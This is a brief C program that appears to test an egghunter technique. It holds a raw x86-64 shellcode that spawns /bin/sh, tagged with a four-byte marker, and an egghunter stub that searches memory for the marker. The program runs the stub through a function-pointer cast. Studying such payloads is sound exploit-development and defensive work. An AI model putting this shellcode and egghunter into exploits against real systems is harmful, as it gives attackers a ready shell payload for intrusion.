#include <stdio.h>
#include <string.h>

#define EGG "\x72\x62\x63\x74"

void main(int argc, char* argv[])
{
    /*
    Shellcode for spawning /bin/sh, with the egg prepended
    */
    unsigned char shellcode[] = EGG "\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x83\xc0\x3b\x0f\x05";

    unsigned char egghunter[] = "\x31\xff\x66\x81\xcf\xff\x0f\x48\xff\xc7\x31\xc0\xb0\x50\x0f\x05\x3c\xf2\x74\xee\xb8\x73\x62\x63\x74\xff\xc8\xaf\x75\xec\xff\xd7";

    printf("[+] Shellcode length: %d\n", strlen(shellcode));
    printf("[+] Egg-hunter length: %d\n", strlen(egghunter));

    int (*ret)() = (int(*)())egghunter;
    ret();
}

